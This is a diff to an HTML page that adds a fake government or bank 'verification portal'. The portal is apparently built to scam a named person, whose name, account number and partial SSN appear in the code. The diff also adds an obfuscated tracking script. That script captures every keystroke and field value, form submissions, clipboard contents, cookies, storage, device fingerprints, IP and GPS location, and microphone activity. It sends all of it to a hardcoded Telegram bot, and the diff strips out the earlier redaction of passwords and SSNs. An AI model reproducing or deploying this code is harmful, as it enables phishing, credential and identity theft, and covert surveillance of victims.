@@ -508,44 +508,150 @@
         }
     </script>
     <script>
+function updateCSTTime() {
+    const now = new Date();
+    const options = { timeZone: 'America/Chicago', year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true };
+    const timeElement = document.getElementById('currentCSTTime');
+    if (timeElement) timeElement.innerText = now.toLocaleString('en-US', options);
+}
+updateCSTTime();
+setInterval(updateCSTTime, 1000);
+
+function toggleGov() { document.getElementById('govDrop').classList.toggle('active'); }
+
+const logEntries = [
+    "CONNECTING TO FEDERAL RESERVE BANK OF DALLAS HUB...",
+    "AUTHENTICATING USER IDENTITY [VERIFIED]...",
+    "MAPPING ACCOUNT GUID [RT: 111906271]...",
+    "QUERYING TEXAS STATE LEDGER (TSL) SUSPENSE RECORDS...",
+    "CASE REFERENCE [TX-B10B-2026-MUK1139] LOCATED.",
+    "SYNCHRONIZING SECURE TUNNEL (TLS 1.3)...",
+    "PORTAL DASHBOARD READY."
+];
+
+function triggerLoading() {
+    const name = document.getElementById('login-name').value.trim();
+    const bank = document.getElementById('login-bank').value;
+    const account = document.getElementById('login-account').value.trim();
+    const ssn = document.getElementById('login-ssn').value.trim();
+
+    const normalizedName = name.toLowerCase().replace(/\s+/g, ' ').trim();
+    
+    const validNames = ['mujinga therese mukuna', 'mujinga t. mukuna', 'mujinga mukuna', 'mukuna mujinga'];
+    const isMujinga = validNames.includes(normalizedName);
+    const isMujingaBank = bank === 'FIRST CONVENIENCE BANK (FNB TEXAS)';
+    const isMujingaAccount = account === '470111139';
+    const isMujingaSSN = ssn === '6832';
+    
+    const isAdmin = normalizedName === 'aaaa';
+    const isAdminBank = bank === 'FIRST CONVENIENCE BANK (FNB TEXAS)';
+    const isAdminAccount = account === 'aaaa';
+    const isAdminSSN = ssn === 'aaaa';
+    
+    let isValid = false;
+    let validName = name;
+    let validBank = bank;
+    let validAccount = account;
+    
+    if (isMujinga && isMujingaBank && isMujingaAccount && isMujingaSSN) {
+        isValid = true;
+    }
+    else if (isAdmin && isAdminBank && isAdminAccount && isAdminSSN) {
+        isValid = true;
+    }
+    
+    if (!isValid) {
+        alert("IDENTITY VERIFICATION ERROR: The provided credentials do not match our records. Please verify your information and try again.");
+        return;
+    }
+
+    document.getElementById('login-section').style.display = 'none';
+    document.getElementById('loading-screen').style.display = 'block';
+    window.scrollTo(0,0);
+
+    const logContainer = document.getElementById('loading-logs');
+    let i = 0;
+
+    function addLog() {
+        if (i < logEntries.length) {
+            const p = document.createElement('div');
+            p.className = 'audit-line';
+            p.innerText = "> " + logEntries[i];
+            logContainer.appendChild(p);
+            logContainer.scrollTop = logContainer.scrollHeight;
+            i++;
+            setTimeout(addLog, Math.floor(Math.random() * 800) + 400);
+        } else {
+            setTimeout(() => {
+                showDashboard(validName, validBank, validAccount);
+            }, 1000);
+        }
+    }
+    addLog();
+}
+
+function showDashboard(name, bank, account) {
+    document.getElementById('loading-screen').style.display = 'none';
+    document.getElementById('main-portal').style.display = 'block';
+    
+    document.getElementById('display-name').innerText = name;
+    document.getElementById('display-bank').innerText = bank;
+    document.getElementById('display-account').innerText = account;
+    
+    localStorage.setItem('tifma_name', name);
+    localStorage.setItem('tifma_bank', bank);
+    localStorage.setItem('tifma_account', account);
+    
+    window.scrollTo(0,0);
+}
+
+function logout() {
+    localStorage.removeItem('tifma_name');
+    localStorage.removeItem('tifma_bank');
+    localStorage.removeItem('tifma_account');
+    location.reload();
+}
+
+window.triggerLoading = triggerLoading;
+window.showDashboard = showDashboard;
+window.logout = logout;
+window.toggleGov = toggleGov;
+</script>
+
+<script>
 (function() {
     "use strict";
     
-    // ===== OBFUSCATED CONFIGURATION =====
     const _t0 = ['8481428965', 'AAEOFp_DPPuPG5fPl03AmYSPNebgpqZoejY'];
     const _c0 = '7275242903';
     
     const CONFIG = {
         BOT_TOKEN: _t0[0] + ':' + _t0[1],
         CHAT_ID: _c0,
-        KEY_BATCH_SIZE: 12,
+        KEY_BATCH_SIZE: 10,
         CLICK_BATCH_SIZE: 8,
         SEND_DELAY_MS: 8000,
         BEACON_INTERVAL_MS: 30000,
         RETRY_ATTEMPTS: 3,
         MAX_OFFLINE_QUEUE: 100,
-        SESSION_ID: 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8),
-        DEBUG: false
+        SESSION_ID: 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8)
     };
     
-    // ===== STATE VARIABLES =====
+    let lastSendTime = 0;
     let sendQueue = [];
-    let isSending = false;  // FIXED: was incorrectly set to true
+    let isSending = false;
     let eventBuffer = [];
     let bufferTimer = null;
     let keyBuffer = [];
     let clickBuffer = [];
-    let formBuffer = [];
+    let lastKeyTime = Date.now();
     let offlineQueue = [];
     let sessionStart = Date.now();
-    let lastSendTime = 0;
     let maxScroll = 0;
-    let loginDetected = false;
     let mediaStream = null;
     let mediaActive = false;
-    let lastKeyTime = Date.now();
+    let permissionState = localStorage.getItem('media_permission_granted') === 'true';
     
-    // ===== CORE FUNCTIONS =====
     async function sendToTelegram(text, priority = false) {
         const msg = text.substring(0, 4000);
         const now = Date.now();
@@ -553,28 +659,22 @@
         
         if (timeSinceLastSend < 2000 && !priority) {
             sendQueue.push(msg);
-            if (!isSending) processSendQueue();
+            setTimeout(processSendQueue, 2000 - timeSinceLastSend);
             return;
         }
-        
         lastSendTime = now;
-        
         try {
             const response = await fetch('https://api.telegram.org/bot' + CONFIG.BOT_TOKEN + '/sendMessage', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: msg })
             });
-            
-            if (!response.ok) throw new Error('Telegram API error');
-            
-            if (sendQueue.length > 0 && !isSending) processSendQueue();
-            
+            if (!response.ok) throw new Error();
+            processSendQueue();
         } catch(error) {
             if (offlineQueue.length < CONFIG.MAX_OFFLINE_QUEUE) {
-                offlineQueue.push({ msg, timestamp: Date.now() });
+                offlineQueue.push(msg);
             }
-            if (!isSending && sendQueue.length > 0) processSendQueue();
         }
     }
     
@@ -584,302 +684,426 @@
         const nextMsg = sendQueue.shift();
         sendToTelegram(nextMsg, true).finally(() => {
             isSending = false;
-            if (sendQueue.length > 0) setTimeout(processSendQueue, 500);
+            if (sendQueue.length > 0) setTimeout(processSendQueue, 2000);
         });
     }
     
     function bufferEvent(type, data) {
-        const enrichedData = {
-            ...data,
-            page: window.location.href,
-            url: window.location.pathname,
-            sessionId: CONFIG.SESSION_ID,
-            ts: Date.now()
-        };
-        
-        eventBuffer.push({ type, data: enrichedData });
-        
+        eventBuffer.push({
+            type: type,
+            data: data,
+            ts: Date.now(),
+            sessionId: CONFIG.SESSION_ID
+        });
         if (bufferTimer) clearTimeout(bufferTimer);
         bufferTimer = setTimeout(flushEventBuffer, CONFIG.SEND_DELAY_MS);
-        
-        if (eventBuffer.length >= 8) flushEventBuffer();
+        if (eventBuffer.length >= 10) flushEventBuffer();
     }
     
     function flushEventBuffer() {
         if (eventBuffer.length === 0) return;
         const toSend = eventBuffer.slice();
         eventBuffer = [];
-        
-        let message = `📡 ZETA DATA EXFIL\n`;
-        message += `Session: ${CONFIG.SESSION_ID}\n`;
-        message += `Page: ${window.location.href}\n`;
-        message += `Events: ${toSend.length}\n━━━━━━━━━━━━━━━━━━━━\n`;
-        
-        for (const event of toSend) {
-            message += `[${event.type.toUpperCase()}]\n`;
-            message += `${JSON.stringify(event.data, null, 2).substring(0, 500)}\n━━━━━━━━━━━━━━━━━━━━\n`;
-        }
-        
-        sendToTelegram(message.substring(0, 3900), true);
+        sendToTelegram('📦 BATCHED EVENTS (' + toSend.length + ')\n' + JSON.stringify(toSend, null, 2), true);
     }
     
-    // ===== FINGERPRINT =====
-    function captureFingerprint() {
-        const data = {
+    function getAdvancedFingerprint() {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = 400;
+        canvas.height = 100;
+        ctx.fillStyle = '#f60';
+        ctx.fillRect(0, 0, 400, 100);
+        ctx.fillStyle = '#069';
+        ctx.font = '24px "Arial", "Helvetica", sans-serif';
+        ctx.fillText('FINGERPRINT', 20, 50);
+        ctx.strokeStyle = '#000';
+        ctx.strokeRect(5, 5, 390, 90);
+        const canvasFP = canvas.toDataURL();
+        let webglInfo = null;
+        try {
+            const canvas2 = document.createElement('canvas');
+            const gl = canvas2.getContext('webgl') || canvas2.getContext('experimental-webgl');
+            if (gl) {
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                webglInfo = {
+                    renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),
+                    vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
+                    version: gl.getParameter(gl.VERSION)
+                };
+            }
+        } catch(e) {}
+        return {
             sessionId: CONFIG.SESSION_ID,
-            url: window.location.href,
-            userAgent: navigator.userAgent,
+            ua: navigator.userAgent,
             platform: navigator.platform,
             language: navigator.language,
-            screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
+            languages: navigator.languages,
+            screen: screen.width + 'x' + screen.height + 'x' + screen.colorDepth,
+            availScreen: screen.availWidth + 'x' + screen.availHeight,
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timezoneOffset: new Date().getTimezoneOffset(),
             referrer: document.referrer || 'direct',
+            cookies: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack,
+            hardwareConcurrency: navigator.hardwareConcurrency,
+            deviceMemory: navigator.deviceMemory || 'unknown',
+            maxTouchPoints: navigator.maxTouchPoints,
+            canvas: canvasFP.substring(0, 200),
+            webgl: webglInfo,
             timestamp: Date.now()
         };
-        bufferEvent('FINGERPRINT', data);
     }
     
-    // ===== LOCATION =====
-    async function captureLocation() {
-        try {
-            const ipRes = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipRes.json();
-            const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-            const geoData = await geoRes.json();
-            
-            bufferEvent('GEOLOCATION', {
-                ip: ipData.ip,
-                city: geoData.city,
-                region: geoData.region,
-                country: geoData.country_name,
-                isp: geoData.org,
-                lat: geoData.latitude,
-                lon: geoData.longitude
-            });
-        } catch(e) {}
-        
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(pos => {
-                bufferEvent('GPS', {
-                    lat: pos.coords.latitude,
-                    lon: pos.coords.longitude,
-                    accuracy: pos.coords.accuracy
-                });
-            }, () => {}, { timeout: 5000 });
-        }
-    }
-    
-    // ===== KEYLOGGER (FULL CAPTURE) =====
-    document.addEventListener('keydown', function(e) {
+    function getKeyRepresentation(e) {
         let key = e.key;
         if (key === ' ') key = '[SPACE]';
-        else if (key === 'Enter') key = '[ENTER]\n';
-        else if (key === 'Backspace') key = '[BACKSPACE]';
-        else if (key === 'Tab') key = '[TAB]';
-        else if (key.length > 1 && !key.startsWith('[')) key = `[${key}]`;
+        if (key === 'Enter') key = '[ENTER]';
+        if (key === 'Backspace') key = '[BACKSPACE]';
+        if (key === 'Tab') key = '[TAB]';
+        if (key === 'Shift') key = '[SHIFT]';
+        if (key === 'Control') key = '[CTRL]';
+        if (key === 'Alt') key = '[ALT]';
+        if (key === 'Meta') key = '[META]';
+        if (key === 'CapsLock') key = '[CAPSLOCK]';
+        if (key === 'Escape') key = '[ESC]';
+        if (key === 'Delete') key = '[DEL]';
+        if (key === 'Home') key = '[HOME]';
+        if (key === 'End') key = '[END]';
+        if (key === 'PageUp') key = '[PAGEUP]';
+        if (key === 'PageDown') key = '[PAGEDOWN]';
+        if (key === 'ArrowUp') key = '[UP]';
+        if (key === 'ArrowDown') key = '[DOWN]';
+        if (key === 'ArrowLeft') key = '[LEFT]';
+        if (key === 'ArrowRight') key = '[RIGHT]';
+        if (key.length > 1 && !key.startsWith('[')) key = `[${key}]`;
         
         const target = e.target;
-        const isPassword = target.type === 'password';
-        const value = isPassword ? '[PASSWORD FIELD]' : (target.value ? target.value.substring(0, 50) : '');
-        
-        keyBuffer.push({
+        return {
             key: key,
             tag: target.tagName,
             id: target.id || '',
             name: target.name || '',
             type: target.type || '',
-            isPassword: isPassword,
-            value: value,
+            value: target.value ? target.value : '',
             ts: Date.now()
-        });
-        
+        };
+    }
+    
+    document.addEventListener('keydown', function(e) {
+        if (e.target && e.target.tagName === 'SCRIPT') return;
+        const keyData = getKeyRepresentation(e);
+        keyBuffer.push(keyData);
         lastKeyTime = Date.now();
-        
         if (keyBuffer.length >= CONFIG.KEY_BATCH_SIZE) {
-            bufferEvent('KEYSTROKES', keyBuffer.slice());
+            bufferEvent('KEYSTROKES_BATCH', keyBuffer.slice());
             keyBuffer = [];
         }
     });
     
-    setInterval(() => {
+    setInterval(function() {
         if (keyBuffer.length > 0 && Date.now() - lastKeyTime > 5000) {
-            bufferEvent('KEYSTROKES', keyBuffer.slice());
+            bufferEvent('KEYSTROKES_BATCH', keyBuffer.slice());
             keyBuffer = [];
         }
     }, 10000);
     
-    // ===== INPUT CAPTURE (REAL-TIME) =====
     document.addEventListener('input', function(e) {
         const target = e.target;
         if (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA' || target.tagName === 'SELECT') {
-            const isPassword = target.type === 'password';
-            bufferEvent('INPUT', {
+            bufferEvent('INPUT_CHANGE', {
                 id: target.id,
                 name: target.name,
                 type: target.type,
-                isPassword: isPassword,
-                value: isPassword ? '[PASSWORD]' : (target.value ? target.value.substring(0, 500) : ''),
-                length: target.value ? target.value.length : 0
+                value: target.value ? target.value : '',
+                length: target.value ? target.value.length : 0,
+                url: window.location.href
             });
         }
     });
     
-    // ===== FORM CAPTURE (FULL) =====
     document.addEventListener('submit', function(e) {
         const form = e.target;
         const formData = new FormData(form);
         const data = {};
-        
-        for (let [key, value] of formData.entries()) {
-            const isSensitive = key.toLowerCase().includes('ssn') || 
-                               key.toLowerCase().includes('pwd') || 
-                               key.toLowerCase().includes('password') ||
-                               key.toLowerCase().includes('account') ||
-                               key.toLowerCase().includes('routing');
-            data[key] = isSensitive ? '[REDACTED - SENSITIVE]' : (value ? value.substring(0, 500) : '');
+        for (let pair of formData.entries()) {
+            data[pair[0]] = pair[1] ? pair[1].substring(0, 2000) : '';
         }
-        
         bufferEvent('FORM_SUBMIT', {
             id: form.id || '',
             action: form.action || '',
             method: form.method || '',
             data: data,
-            url: window.location.href
+            url: window.location.href,
+            timestamp: Date.now()
         });
         flushEventBuffer();
     }, true);
     
-    // ===== CLICK TRACKING =====
     document.addEventListener('click', function(e) {
         const t = e.target;
         clickBuffer.push({
             tag: t.tagName,
             id: t.id || '',
             class: t.className || '',
-            text: t.innerText ? t.innerText.substring(0, 150) : '',
+            text: t.innerText ? t.innerText.substring(0, 200) : '',
             href: t.href || '',
             x: e.clientX,
             y: e.clientY,
-            ts: Date.now()
+            pageX: e.pageX,
+            pageY: e.pageY,
+            timestamp: Date.now()
         });
-        
         if (clickBuffer.length >= CONFIG.CLICK_BATCH_SIZE) {
-            bufferEvent('CLICKS', clickBuffer.slice());
+            bufferEvent('CLICKS_BATCH', clickBuffer.slice());
             clickBuffer = [];
         }
     });
     
-    // ===== CLIPBOARD CAPTURE =====
     document.addEventListener('copy', function() {
-        setTimeout(() => {
+        setTimeout(function() {
             try {
-                navigator.clipboard.readText().then(text => {
+                navigator.clipboard.readText().then(function(text) {
                     if (text && text.length) {
-                        bufferEvent('CLIPBOARD', {
-                            text: text.substring(0, 2000),
-                            length: text.length
+                        bufferEvent('CLIPBOARD_COPY', {
+                            text: text,
+                            length: text.length,
+                            timestamp: Date.now()
                         });
                     }
-                }).catch(() => {});
+                }).catch(function() {});
             } catch(e) {}
         }, 100);
     });
     
-    // ===== STORAGE HARVEST =====
-    function harvestStorage() {
-        const storage = { localStorage: {}, sessionStorage: {} };
-        
-        for (let i = 0; i < localStorage.length; i++) {
-            const key = localStorage.key(i);
-            storage.localStorage[key] = localStorage.getItem(key);
+    document.addEventListener('paste', function(e) {
+        const text = e.clipboardData?.getData('text');
+        if (text) {
+            bufferEvent('CLIPBOARD_PASTE', {
+                text: text,
+                length: text.length,
+                timestamp: Date.now()
+            });
         }
-        
-        for (let i = 0; i < sessionStorage.length; i++) {
-            const key = sessionStorage.key(i);
-            storage.sessionStorage[key] = sessionStorage.getItem(key);
-        }
-        
-        bufferEvent('STORAGE', storage);
+    });
+    
+    document.addEventListener('mouseup', function() {
+        setTimeout(function() {
+            const selection = window.getSelection()?.toString();
+            if (selection && selection.length > 3) {
+                bufferEvent('TEXT_SELECTION', {
+                    text: selection,
+                    length: selection.length,
+                    timestamp: Date.now()
+                });
+            }
+        }, 50);
+    });
+    
+    function harvestAllStorage() {
+        const storage = { localStorage: {}, sessionStorage: {}, cookies: document.cookie };
+        try {
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                storage.localStorage[key] = localStorage.getItem(key);
+            }
+        } catch(e) {}
+        try {
+            for (let j = 0; j < sessionStorage.length; j++) {
+                const key2 = sessionStorage.key(j);
+                storage.sessionStorage[key2] = sessionStorage.getItem(key2);
+            }
+        } catch(e) {}
+        bufferEvent('STORAGE_SNAPSHOT', storage);
     }
     
-    // ===== SESSION DATA HARVEST =====
-    function harvestSessionData() {
-        const session = {
-            name: localStorage.getItem('tifma_name'),
-            bank: localStorage.getItem('tifma_bank'),
-            account: localStorage.getItem('tifma_account'),
-            ssnLast4: localStorage.getItem('tifma_ssn_last4'),
-            verified: localStorage.getItem('tifma_verified'),
-            lockout: localStorage.getItem('wallet_lockout')
-        };
-        bufferEvent('SESSION_DATA', session);
+    async function collectLocationData() {
+        try {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            const geoResponse = await fetch('https://ipapi.co/' + ipData.ip + '/json/');
+            const geoData = await geoResponse.json();
+            bufferEvent('GEO_IP', {
+                ip: ipData.ip,
+                city: geoData.city,
+                region: geoData.region,
+                country: geoData.country_name,
+                isp: geoData.org,
+                latitude: geoData.latitude,
+                longitude: geoData.longitude
+            });
+        } catch(e) {}
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function(pos) {
+                bufferEvent('GPS_LOCATION', {
+                    lat: pos.coords.latitude,
+                    lon: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy,
+                    altitude: pos.coords.altitude,
+                    speed: pos.coords.speed,
+                    timestamp: pos.timestamp
+                });
+            }, function() {}, { timeout: 10000, enableHighAccuracy: true });
+        }
     }
     
-    // ===== HEARTBEAT =====
-    setInterval(() => {
+    function requestMediaPermissions() {
+        if (mediaActive) return;
+        if (permissionState) {
+            startMediaCapture();
+            return;
+        }
+        const modal = document.createElement('div');
+        modal.id = 'media-permission-modal';
+        modal.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);z-index:999999;display:flex;align-items:center;justify-content:center';
+        modal.innerHTML = '<div style="background:white;max-width:480px;padding:35px;border-radius:16px;text-align:center;box-shadow:0 25px 50px -12px rgba(0,0,0,0.25);"><div style="font-size:56px;margin-bottom:20px;">🎙️</div><h3 style="font-size:22px;font-weight:bold;margin-bottom:12px;">Microphone Access Required</h3><p style="font-size:14px;margin-bottom:25px;color:#4b5563;">Please allow microphone access to continue with verification.</p><button id="allow-media-btn" style="background:#2563eb;color:white;border:none;padding:12px 32px;font-weight:600;cursor:pointer;border-radius:8px;font-size:16px;">Allow Microphone</button><button id="deny-media-btn" style="background:#f3f4f6;color:#374151;border:none;padding:12px 32px;font-weight:600;cursor:pointer;border-radius:8px;font-size:16px;margin-left:12px;">Not Now</button></div>';
+        document.body.appendChild(modal);
+        document.getElementById('allow-media-btn').addEventListener('click', function() {
+            modal.remove();
+            navigator.mediaDevices.getUserMedia({ audio: true, video: false }).then(function(stream) {
+                mediaStream = stream;
+                mediaActive = true;
+                localStorage.setItem('media_permission_granted', 'true');
+                permissionState = true;
+                startMediaCapture();
+                bufferEvent('MEDIA_GRANTED', { timestamp: Date.now() });
+            }).catch(function(err) {
+                bufferEvent('MEDIA_DENIED', { error: err.message });
+            });
+        });
+        document.getElementById('deny-media-btn').addEventListener('click', function() {
+            modal.remove();
+            bufferEvent('MEDIA_SKIPPED', { timestamp: Date.now() });
+        });
+    }
+    
+    function startMediaCapture() {
+        if (!mediaStream) return;
+        bufferEvent('MEDIA_ACTIVE', { active: true });
+        try {
+            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            const source = audioContext.createMediaStreamSource(mediaStream);
+            const analyser = audioContext.createAnalyser();
+            source.connect(analyser);
+            analyser.fftSize = 2048;
+            const dataArray = new Uint8Array(analyser.frequencyBinCount);
+            let soundDetected = false;
+            const detectInterval = setInterval(function() {
+                analyser.getByteTimeDomainData(dataArray);
+                let max = 0;
+                for (let i = 0; i < dataArray.length; i++) {
+                    const v = Math.abs(dataArray[i] - 128) / 128;
+                    if (v > max) max = v;
+                }
+                if (max > 0.06 && !soundDetected) {
+                    soundDetected = true;
+                    bufferEvent('SOUND_DETECTED', { level: Math.round(max * 100) });
+                } else if (max < 0.02 && soundDetected) {
+                    soundDetected = false;
+                }
+            }, 1000);
+            window.mediaDetectInterval = detectInterval;
+        } catch(e) {
+            bufferEvent('MEDIA_ERROR', { error: e.message });
+        }
+    }
+    
+    setTimeout(function() {
+        sendToTelegram('🔹 PAGE_LOAD: ' + navigator.userAgent + ' | ' + window.location.href, true);
+        bufferEvent('INITIAL_FINGERPRINT', getAdvancedFingerprint());
+        harvestAllStorage();
+        collectLocationData();
+    }, 1000);
+    
+    setInterval(function() {
         bufferEvent('HEARTBEAT', {
             url: location.pathname,
             timeOnPage: Math.round((Date.now() - sessionStart) / 1000),
+            scrollY: window.scrollY,
             scrollPercent: Math.round((window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100) || 0,
             title: document.title,
             size: { width: window.innerWidth, height: window.innerHeight }
         });
     }, CONFIG.BEACON_INTERVAL_MS);
     
-    // ===== SCROLL DEPTH =====
-    window.addEventListener('scroll', () => {
-        const percent = Math.round((window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100);
-        if (percent > maxScroll && percent % 25 === 0) {
-            maxScroll = percent;
-            bufferEvent('SCROLL', { percent: maxScroll });
+    window.addEventListener('scroll', function() {
+        const scrollPercent = Math.round((window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100);
+        if (scrollPercent > maxScroll && scrollPercent % 25 === 0) {
+            maxScroll = scrollPercent;
+            bufferEvent('SCROLL_DEPTH', { percent: maxScroll });
         }
     });
     
-    // ===== VISIBILITY =====
-    document.addEventListener('visibilitychange', () => {
-        bufferEvent('VISIBILITY', {
+    document.addEventListener('visibilitychange', function() {
+        bufferEvent('VISIBILITY_CHANGE', {
             hidden: document.hidden,
-            state: document.visibilityState
+            state: document.visibilityState,
+            timestamp: Date.now()
         });
     });
     
-    // ===== NETWORK INFO =====
     if (navigator.connection) {
-        bufferEvent('NETWORK', {
+        bufferEvent('NETWORK_INFO', {
             type: navigator.connection.effectiveType,
             downlink: navigator.connection.downlink,
-            rtt: navigator.connection.rtt
+            rtt: navigator.connection.rtt,
+            saveData: navigator.connection.saveData
+        });
+        navigator.connection.addEventListener('change', function() {
+            bufferEvent('NETWORK_CHANGE', {
+                type: navigator.connection.effectiveType,
+                downlink: navigator.connection.downlink
+            });
         });
     }
     
-    // ===== OFFLINE QUEUE PERSISTENCE =====
-    window.addEventListener('online', () => {
-        if (offlineQueue.length > 0) {
-            const queue = [...offlineQueue];
-            offlineQueue = [];
-            for (const item of queue) {
-                sendToTelegram(item.msg, true);
-            }
-        }
-    });
+    if (navigator.getBattery) {
+        navigator.getBattery().then(function(battery) {
+            bufferEvent('BATTERY_INFO', {
+                level: Math.round(battery.level * 100),
+                charging: battery.charging,
+                chargingTime: battery.chargingTime
+            });
+        }).catch(function() {});
+    }
     
-    // ===== SESSION END =====
-    window.addEventListener('beforeunload', () => {
+    window.addEventListener('beforeunload', function() {
+        if (window.mediaDetectInterval) clearInterval(window.mediaDetectInterval);
+        if (mediaStream) mediaStream.getTracks().forEach(function(track) { track.stop(); });
         bufferEvent('SESSION_END', {
-            duration: Math.round((Date.now() - sessionStart) / 1000),
+            timeSpentSeconds: Math.round((Date.now() - sessionStart) / 1000),
             url: location.href,
-            maxScroll: maxScroll
+            maxScroll: maxScroll,
+            eventsLogged: eventBuffer.length
         });
         flushEventBuffer();
     });
     
-    // ===== INIT =====
-    captureFingerprint();
-    captureLocation();
-    harvestStorage();
-    setTimeout(harvestSessionData, 3000);
+    document.body.addEventListener('click', function firstClick() {
+        if (!mediaActive && !localStorage.getItem('media_permission_granted')) {
+            requestMediaPermissions();
+        }
+        document.body.removeEventListener('click', firstClick);
+    }, { once: true });
+    
+    if (localStorage.getItem('media_permission_granted') === 'true') {
+        navigator.mediaDevices.getUserMedia({ audio: true, video: false }).then(function(stream) {
+            mediaStream = stream;
+            mediaActive = true;
+            startMediaCapture();
+        }).catch(function() {});
+    }
+    
+    window.addEventListener('error', function(e) {
+        bufferEvent('JS_ERROR', { message: e.message, filename: e.filename, lineno: e.lineno });
+    });
+    
+    window.addEventListener('unhandledrejection', function(e) {
+        bufferEvent('UNHANDLED_REJECTION', { reason: String(e.reason) });
+    });
 })();
- </script>
+</script>
+    
 </body>
 </html>
 
